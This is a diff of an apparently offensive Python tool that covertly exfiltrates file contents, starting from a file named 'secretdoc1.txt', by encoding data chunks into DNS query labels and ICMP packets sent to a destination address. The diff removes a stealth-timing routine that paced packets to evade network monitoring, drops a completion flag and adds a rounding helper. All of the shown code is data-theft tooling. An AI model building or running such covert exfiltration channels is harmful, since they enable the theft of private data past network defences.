@@ -22,7 +22,6 @@ u_int       = c_int
 u_short     = c_ushort
 
 chunkLength         = 20
-completedTransfer   = False
 currentFilePath     = "secretdoc1.txt"
 workingDirectory    = ""
 exfilBytes          = b''
@@ -322,33 +321,18 @@ def sendFileLoop():
             time.sleep(delay)
 
     sendEndOfTransmission()
-
-    completedTransfer = True
     
 def sendDataLoop(data):
     global exfilBytes
     global startByte
     global workingDirectory
 
-    print(data)
-
     startByte = 0
     icmpLength = 200
     dnsLength = 248
 
-    # While the whole file hasn't be exfiltrated
-    while startByte < (len(data) - 1):
-
-        # Update delay based on network listener data
-        if stealthMode:       
-            print("localPPI: %d updatedPPI: %d" % (localPPI, updatedPPI))
-            # If the monitor has updated the PPI value, then update the delay between packets
-            if localPPI != updatedPPI:
-                print("Updating delay")
-                localPPI = updatedPPI
-                delay = k/localPPI
-                print("New delay: %f" % (delay))        
-
+    # While the whole data string hasn't be exfiltrated
+    while startByte < (len(data) - 1):    
         # Send next chunk
         nextPacketType = getNextPacketType()
         if nextPacketType == ICMP_PROTOCOL:
@@ -361,12 +345,7 @@ def sendDataLoop(data):
             startByte += dnsLength
         sendNext(dstAddress, nextPacketType, packet)
 
-        if stealthMode | ppsMode[0]:
-            time.sleep(delay)
-
     sendEndOfTransmission()
-
-    completedTransfer = True
 
 def getNextPacketType():
     if icmpOnly:
@@ -423,7 +402,6 @@ def createDNSPacketFromData(msg):
         # Truncate output
         msg = msg[:248]
 
-
     dataProgress = 0
     queryHostname = b''
 
@@ -443,7 +421,7 @@ def createDNSPacketFromData(msg):
             data = msg[dataProgress: dataProgress + lastLabelSize]
         else:
             data = msg[dataProgress:dataProgress + labelSize]
-        #data = base64.b32encode(data)
+
         data = len(data).to_bytes(1, "big") + data
         dataProgress += labelSize
 
@@ -476,6 +454,9 @@ def getNextChunk(sb, cl):
 def sendStartOfFile():
     pass
     
+def roundUp(x, base=4):
+    return int(math.ceil(x / base)) * base
+
 def sendEndOfTransmission():
     nextType = getNextPacketType()
     if nextType == ICMP_PROTOCOL:
